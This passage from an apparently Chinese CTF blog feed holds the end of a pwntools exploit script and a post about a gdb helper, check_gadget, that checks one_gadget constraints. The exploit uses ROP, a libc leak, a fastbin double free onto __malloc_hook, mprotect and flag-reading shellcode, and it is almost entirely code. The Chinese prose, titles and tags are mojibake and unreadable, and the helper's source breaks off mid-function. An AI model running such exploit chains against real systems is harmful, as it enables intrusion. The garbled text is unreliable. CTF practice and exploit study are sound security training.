class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content?\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401193</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401191</span></span><br><span class="line">bss_addr=<span class="number">0x602080</span></span><br><span class="line">pop_rsp_r13_r14_r15=<span class="number">0x000000000040118d</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(e.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rsp_r13_r14_r15)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;what is your name? \n&quot;</span>,payload)</span><br><span class="line">add(<span class="number">0x800</span>)</span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x0000000000143f08</span><span class="comment">#0x0000000000143e08#</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">mprotect_addr=libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#double free</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(add_rsp_ret)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">debug(p,<span class="number">0x4010FB</span>,<span class="number">0x4010EF</span>,<span class="number">0x4010E3</span>,<span class="number">0x400C11</span>,<span class="number">0x400B2F</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">orw=<span class="string">b&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x6A\x00\x5F\x6A\x00\x5A\x68\x01\x01\x00\x00\x58\x0F\x05\x50\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0x602000</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect_addr)</span><br><span class="line">payload+=p64(<span class="number">0x6020e0</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211121444189.png" alt="image-20221112144403666"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> double free </tag>
            
            <tag> æ²™ç®± </tag>
            
            <tag> UAF </tag>
            
            <tag> æ ˆå †ç»“åˆ </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>check_gadget--æ£€æµ‹one_gadgetèƒ½å¦ä½¿ç”¨çš„gdbå‘½ä»¤</title>
      <link href="/posts/bd34f701.html"/>
      <url>/posts/bd34f701.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä½œä¸ºä¸€ä¸ª <code>pwner</code> ï¼Œå¯¹ <code>one_gadget</code> è‚¯å®šä¸ä¼šé™Œç”Ÿï¼Œå¦‚æœåœ¨èƒ½åŠ«æŒæ‰§è¡Œæµçš„å‰æä¸‹ï¼Œ <code>one_gadget</code> åœ¨åŠ«æŒæ‰§è¡Œæµçš„ä½ç½®ä¹Ÿæ°å·§èƒ½ç”¨ï¼Œé‚£å°±å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šç®€åŒ–è·å– <code>shell</code> çš„æ“ä½œï¼Œå› ä¸ºæ‰§è¡Œ <code>system(&quot;/bin/sh\x00&quot;)</code> æ˜¯éœ€è¦æ§åˆ¶å‚æ•°çš„ï¼Œæœ‰äº›æƒ…å†µä¸‹åŠ«æŒæ‰§è¡Œæµå®¹æ˜“ä½†å¯èƒ½æ§åˆ¶å‚æ•°è¿˜å¾—å†åºŸäº›åŠ›æ°”ï¼Œæ­¤æ—¶æˆåŠŸæ‰“ä¸€å‘ <code>one_gadget</code> å¯ä»¥è¯´æ˜¯æ–¹ä¾¿åˆè¿…é€Ÿã€‚</p><p>ä½†å› ä¸º <code>one_gadget</code> æ¡ä»¶çš„é™åˆ¶ï¼Œ <code>one_gadget</code> æˆåŠŸçš„æ¦‚ç‡å¹¶ä¸é«˜ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæˆ–è€…è°ƒè¯•åˆ°åŠ«æŒæ‰§è¡Œæµçš„ä½ç½®è§‚å¯Ÿä¸€ä¸‹å¯„å­˜å™¨å’Œå†…å­˜çš„æƒ…å†µè¿›è¡Œåˆ¤æ–­ã€‚å¾ˆæ—©ä¹‹å‰æˆ‘å°±æœ‰è¿™æ ·ä¸€ä¸ªæƒ³æ³•ï¼Œå¦‚æœèƒ½ç”¨ <code>gdb</code> è°ƒè¯•åˆ°åŠ«æŒçš„åœ°å€å¤„ï¼Œè¾“å…¥ä¸€ä¸ªå‘½ä»¤ç›´æ¥åˆ¤æ–­æ‰€æœ‰çš„ <code>one_gadget</code> èƒ½å¦ç”Ÿæ•ˆè¯¥æœ‰å¤šæ–¹ä¾¿ã€‚ç»ˆäºåœ¨å‡ å¤©å‰è¿›è¡Œäº†åŠ¨æ‰‹å®è·µï¼Œå¹¶å°†å…¶å†™å‡ºæ¥ã€‚</p><p><code>check_gadget</code> æ˜¯ä¸€ä¸ª <code>gdb</code> å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æˆ‘æ˜¯ç”¨ <code>python</code> è¿›è¡Œç¼–å†™çš„ è¿™ç¯‡ <a href="https://zikh26.github.io/posts/26ba4673.html">æ–‡ç« </a> è®°å½•äº†å¦‚ä½•ç”¨ <code>python</code> æ¥è‡ªå®šä¹‰å‘½ä»¤ã€‚</p><h2 id="ä½¿ç”¨æ•ˆæœ"><a href="#ä½¿ç”¨æ•ˆæœ" class="headerlink" title="ä½¿ç”¨æ•ˆæœ"></a>ä½¿ç”¨æ•ˆæœ</h2><p>æ­¤å¤„æ§åˆ¶äº† <code>__free_hook</code> </p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081628082.png" alt="image-20230208162838925" style="zoom:50%;" /><p>ç„¶åæˆ‘ä»¬ <code>si</code> è¿›å»ï¼Œä½¿ç”¨ <code>check_gadget</code> å‘½ä»¤ï¼Œå‘ç°äº†ä¸€ä¸ªå¯ç”¨çš„ <code>one_gadget</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081627797.png" alt="image-20230208162716225" style="zoom: 50%;" /><p>è¯¥å‘½ä»¤æ˜¯åˆ¤æ–­å½“å‰ä½ç½®çš„ <code>one_gadget</code> èƒ½å¦ç”Ÿæ•ˆ,æ‰€ä»¥è¿™ä¸ªå‘½ä»¤åœ¨å“ªé‡Œéƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†çœŸæ­£ç”¨åˆ° <code>one_gadget</code> çš„åœ°æ–¹åº”è¯¥æ˜¯æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œæµçš„åœ°å€ã€‚</p><p>å³ä½¿åœ¨å¯¹ <code>32</code> ä½çš„ç¨‹åºçš„åˆ¤æ–­ä¸­ï¼Œè¯¥å‘½ä»¤ä¾ç„¶å‘æŒ¥å‡ºè‰²</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081633584.png" alt="image-20230208163319420"></p><h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h2><p>è¿™ä¸ªå‘½ä»¤æœ¬èº«æ˜¯ä¾èµ– <code>one_gadget</code> çš„è¿”å›æ¡ä»¶è¿›è¡Œåˆ¤æ–­çš„ï¼Œä½†æœ‰æ—¶å€™ <code>one_gadget</code> ç»™å‡ºçš„æ¡ä»¶è™½ç„¶ä¸æ»¡è¶³ä½†ä¹Ÿèƒ½è·å– <code>shell</code> ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œè€Œ <code>check_gadget</code> å‘½ä»¤æ— æ³•æ£€æµ‹å‡ºæ¥è¿™ç§æƒ…å†µã€‚</p><p>ä¸‹å›¾æ˜¯è·³è½¬åˆ°äº†ä¸€ä¸ª <code>one_gadget</code> ä¸­ï¼Œå¹¶æ²¡æœ‰æ»¡è¶³ <code>one_gadget</code> çš„æ¡ä»¶ï¼Œä½†ä¾ç„¶å¯ä»¥è·å– <code>shell</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081609202.png" alt="image-20230208160957660" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081611903.png" alt="image-20230208161106805" style="zoom:50%;" /><h2 id="è®¾è®¡æ€è·¯"><a href="#è®¾è®¡æ€è·¯" class="headerlink" title="è®¾è®¡æ€è·¯"></a>è®¾è®¡æ€è·¯</h2><p>åˆ¤æ–­ <code>one_gadget</code> çš„å¤§è‡´æƒ³æ³•æ— éå°±ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯ç›´æ¥æ”¹å˜ <code>rip</code> è·‘ä¸€é <code>one_gadget</code> ï¼ˆ <strong>winmt</strong> å¸ˆå‚…ç»™æˆ‘çš„æç¤ºæ˜¯åœ¨å½“å‰è¦æµ‹è¯• <code>one_gadget</code> çš„ä½ç½®ç›´æ¥å¼€å¤šä¸ªå­è¿›ç¨‹ç„¶ååˆ†åˆ«æ”¹å˜ <code>rip</code> ä¸ºä¸åŒçš„ <code>one_gadget</code> ä»¥ä¾¿æµ‹è¯•æ‰€æœ‰çš„ <code>one_gadget</code> ï¼‰ï¼Œç¬¬äºŒä¸ªæ€è·¯å°±æ˜¯æˆ‘çš„è¿™ç§ï¼Œå»å°† <code>one_gadget</code> çš„æ¡ä»¶æå–å‡ºæ¥ï¼Œè®¿é—®å¯„å­˜å™¨å’Œå†…å­˜çš„å€¼ï¼Œæ¥æ£€æŸ¥æ¡ä»¶æ˜¯å¦æˆç«‹ã€‚</p><p>å…¶å®ç¬¬ä¸€ç§æ€è·¯æˆ‘è®¤ä¸ºæ‰æ˜¯æœ€ä¼˜è§£ï¼Œä¸»è¦æ˜¯ <strong>winmt</strong> å¸ˆå‚…ç»™æˆ‘è¯´è¿™ç§æ€è·¯çš„æ—¶å€™æˆ‘å·²ç»æŠŠå‘½ä»¤å†™å®Œäº† QAQ ,å› ä¸ºç¬¬äºŒç§æ€è·¯æœ‰ä¸Šé¢æ‰€æåˆ°çš„ç¼ºé™·ã€‚</p><p>ä¸‹é¢è¯´ä¸€ä¸‹æˆ‘è¿™ä¸ªå‘½ä»¤çš„æ•´ä½“å®ç°æ€è·¯</p><ol><li>é¦–å…ˆå»è·å– <code>one_gadget</code> çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œé€ä¸€åˆ†ç»„</li><li>é€ä¸€åˆ¤æ–­æ¯ä¸ª <code>one_gadget</code> ä¸­çš„æ¡ä»¶ï¼Œåˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œ <code>if</code> åˆ¤æ–­è¯†åˆ«å…¶ç‰¹å¾ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°</li><li>è·å–å…¶å…³é”®ä¿¡æ¯ï¼Œæ¯”å¦‚ <code>[rsp+0x40] == NULL</code> è¿™ä¸ªæ¡ä»¶,å°±éœ€è¦å…ˆè¯†åˆ«å‡ºæ¥å¤–é¢æœ‰ä¸€ç»„ <code>[]</code> ï¼Œç„¶åè¿˜éœ€è¦æå–å‡ºæ¥ <code>rsp</code> <code>+</code> <code>0x40</code> è¿™ä¸‰ä¸ªå…³é”®ä¿¡æ¯ï¼Œåˆ©ç”¨ <code>gdb</code> æ¨¡å—ä¸­çš„ä¸€äº›å‡½æ•°æ¥è®¿é—®å¯„å­˜å™¨å’Œå†…å­˜çš„å€¼ï¼Œè¿›è¡Œå¤„ç†åæ¥åˆ¤æ–­ç­‰å¼æ˜¯å¦æˆç«‹</li><li>æœ€åå°†ä¸€ç»„å‘½ä»¤çš„è¿”å›å€¼éƒ½å­˜å‚¨åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­ï¼Œåªéœ€è¦éå†è¿”å›å€¼åˆ—è¡¨å°±çŸ¥é“å“ªç»„ <code>one_gadget</code> å¯ä»¥ä½¿ç”¨æˆ–è€…ä¸èƒ½ä½¿ç”¨</li></ol><h2 id="å¦‚ä½•ä½¿ç”¨"><a href="#å¦‚ä½•ä½¿ç”¨" class="headerlink" title="å¦‚ä½•ä½¿ç”¨"></a>å¦‚ä½•ä½¿ç”¨</h2><p>é¦–å…ˆéœ€è¦ç¡®å®šä½ çš„ <code>gdb</code> ç‰ˆæœ¬è¦æ¯”è¾ƒæ–°ï¼Œè‡³å°‘æˆ‘åœ¨è€æ‰ç‰™çš„ <code>ubuntu18.04</code> ä¸­ï¼Œ<code>gdb</code> ç‰ˆæœ¬ä¸º <code>8.1.1</code> æ˜¯æ²¡æ³•ç”¨çš„ã€‚æˆ‘ä½¿ç”¨è¿™ä¸ªå‘½ä»¤çš„ç¯å¢ƒæ˜¯ <code>ubuntu 22.04</code> <code>gdb</code> ç‰ˆæœ¬ä¸º <code>12.0.90</code> </p><p>ç„¶ååˆ›å»ºä¸€ä¸ª <code>command.py</code> æ–‡ä»¶ï¼ˆåå­—éšæ„ï¼Œä½ç½®ä¹Ÿéšæ„ï¼‰ï¼Œå°†ä¸‹é¢çš„æºä»£ç å¤åˆ¶è¿›å»</p><p>ç„¶ååœ¨ <code>.gdbinit</code> æ–‡ä»¶ä¸­å¼•å…¥è¿™ä¸ª <code>command.py</code> æ–‡ä»¶å³å¯ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081641185.png" alt="image-20230208164134100"></p><p>ç„¶åå¯åŠ¨ <code>gdb</code> è°ƒè¯•ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤äº†</p><h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a,b=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_path</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line:  </span><br><span class="line">        string=line.split()[-<span class="number">1</span>]</span><br><span class="line">        string = string[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gadget_info</span>(<span class="params">library</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ä½œç”¨æ˜¯è·å–å½“å‰ libc çš„ one_gadgetä¿¡æ¯ -l2é™¤å¤–</span></span><br><span class="line"><span class="string">    å°†æ¯ä¸€ç»„çš„ one_gadget ä¿¡æ¯ï¼ˆåœ°å€å’Œæ¡ä»¶ï¼‰æ”¾åˆ°ä¸€ä¸ªå…ƒç»„é‡Œé¢ï¼Œä½œä¸ºè¿”å›åˆ—è¡¨çš„ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">    library(str): å½“å‰ç¨‹åºæ‰€ä¾èµ–çš„ libc åº“è·¯å¾„</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">    gadgets_info(list): åˆ—è¡¨ä¸­çš„å…ƒç´ æ˜¯å…ƒç»„ï¼ˆè£…æœ‰ä¸€ç»„ one_gadget ä¿¡æ¯ï¼‰ï¼Œåç»­è¿›è¡Œæ¡ä»¶åˆ¤æ–­æ—¶åªéœ€è¦å¯¹è¯¥åˆ—è¡¨è¿›è¡Œéå†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;one_gadget&quot;</span>, library], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">if</span> (result.returncode != <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: &quot;</span>, result.stderr.decode().strip())</span><br><span class="line">        sys.exit(result.returncode)</span><br><span class="line">    gadgets = result.stdout.decode().strip().split(<span class="string">&quot;\n\n&quot;</span>)  <span class="comment"># å°†æ¯ä¸ªgadgetçš„æ¡ä»¶å’Œä¿¡æ¯éƒ½ä½œä¸ºä¸€ä¸ªå…ƒç´ å­˜å‚¨åˆ°åˆ—è¡¨ä¸­</span></span><br><span class="line">    gadgets_info = []</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        <span class="comment"># ä¾æ¬¡å¯¹æ¯ç»„å…ƒç´ è¿›è¡Œå•ç‹¬çš„å¤„ç†</span></span><br><span class="line">        address_line, constraints_line = gadget.strip().split(<span class="string">&quot;\nconstraints:&quot;</span>)</span><br><span class="line">        address = address_line.strip().split()[<span class="number">0</span>]</span><br><span class="line">        constraints = constraints_line.strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        gadgets_info.append((address, constraints))</span><br><span class="line">    <span class="keyword">return</span> gadgets_info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="keyword">return</span> gdb.parse_and_eval(<span class="string">&#x27;$&#x27;</span>+register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_address_permissions</span>(<span class="params">address</span>):</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap &quot;</span>+<span class="built_in">str</span>(address),to_string=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;There are no mappings for specified address or module&quot;</span> <span class="keyword">in</span> recv_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    recv_data=recv_data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    recv_data=recv_data.strip().split()</span><br><span class="line">    permissions=recv_data[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;w&#x27;</span> <span class="keyword">in</span> permissions:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_got_address_of_libc</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ç”¨æ¥åˆ¤æ–­ç›®æ ‡åœ°å€æ˜¯å¦ä¸º got_address_of_libc(è¿™ä¸ªåœ°å€æ˜¯ libc ä¸­å…·æœ‰ rw æƒé™çš„é¦–åœ°å€)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">    string(str):ä¼ å…¥çš„ä¸º one_gadget éœ€è¦åˆ¤æ–­æ˜¯å¦ä¸º got_address_of_libcçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">    ä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="string">    &quot;ebx is the GOT address of libc&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼:</span></span><br><span class="line"><span class="string">    (bool):å¦‚æœç›®æ ‡åœ°å€ä¸º got_address_of_libc é‚£ä¹ˆè¿”å› True ï¼Œåä¹‹è¿”å› False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">match</span>=re.findall(<span class="string">&#x27;(\w+) is the GOT address of libc&#x27;</span>,string)</span><br><span class="line">    register_value=get_register_value(<span class="keyword">match</span>[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(register_value) &lt; <span class="number">0</span>:</span><br><span class="line">        register_value=register_value+(<span class="number">1</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;rw&quot;</span> <span class="keyword">in</span> line <span class="keyword">and</span> <span class="string">&quot;libc&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            got_address_of_libc=line.split()[<span class="number">0</span>][<span class="number">5</span>:]</span><br><span class="line">            <span class="keyword">if</span> register_value == <span class="built_in">int</span>(got_address_of_libc,<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_writeable_check</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯æ¥åˆ¤æ–­one_gadgetä¸­æŸä¸ªåœ°å€æ˜¯å¦å…·æœ‰å¯å†™çš„æƒé™</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">        address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">        [r10] == NULL || r10 == NULL</span></span><br><span class="line"><span class="string">        [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">    ä¾‹å¦‚ä¸Šé¢one_gadgetçš„ç¬¬ä¸€ä¸ªæ¡ä»¶  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°å°†è‡ªå·±è·å–rbp-0x78 (å¦‚æœæ˜¯å•ä¸ªå¯„å­˜å™¨ä¹Ÿå¯ä»¥è¿›è¡Œåˆ¤æ–­ æ¯”å¦‚åˆ¤æ–­rsiå½“å‰åœ°å€æ˜¯å¦å…·æœ‰å†™çš„æƒé™) çš„åœ°å€åˆ¤æ–­å…¶æ˜¯å¦ä¸ºä¸€ä¸ªå…·æœ‰å†™æƒé™çš„åœ°å€</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">    string(str):è¯¥å‚æ•°æ˜¯one_gadgetå…³äºæŸä¸ªåœ°å€æ˜¯å¦ä¸ºå¯å†™çš„æ¡ä»¶å­—ç¬¦ä¸²  ä¾‹å¦‚â€œaddress rbp-0x78 is writableâ€</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">    (bool): åˆ¤æ–­ç›®æ ‡åœ°å€æ˜¯å¦å…·æœ‰å¯å†™æƒé™  å¦‚æœå…·æœ‰å†™æƒé™åˆ™è¿”å›True  åä¹‹è¿”å›False</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    result = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(\w+)&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        result = re.findall(<span class="string">r&#x27;\b\w+\b&#x27;</span>, string)</span><br><span class="line">        result = result[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        result=result[<span class="number">0</span>]</span><br><span class="line">        register=result[<span class="number">0</span>]</span><br><span class="line">        operator=result[<span class="number">1</span>]</span><br><span class="line">        operand=result[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))-<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            calc_value=<span class="built_in">int</span>(get_register_value(register))+<span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(calc_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(result)==<span class="number">3</span>:</span><br><span class="line">        register_value=get_register_value(result)</span><br><span class="line">        <span class="keyword">if</span> register_value==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> get_address_permissions(register_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_register_value_ptr</span>(<span class="params">register</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ä½œç”¨è·å–å¯„å­˜å™¨æ‰€æŒ‡å‘çš„å€¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">    register(str):è¢«è®¿é—®çš„å¯„å­˜å™¨åç§°</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">    (int):å¦‚æœå¯„å­˜å™¨å€¼ä¸º0æˆ–è€…å¯„å­˜å™¨çš„å€¼ä¸ºéæ³•åœ°å€åˆ™è¿”å›-1  å¦åˆ™è¿”å›å¯„å­˜å™¨æ‰€æŒ‡å‘çš„å€¼</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span 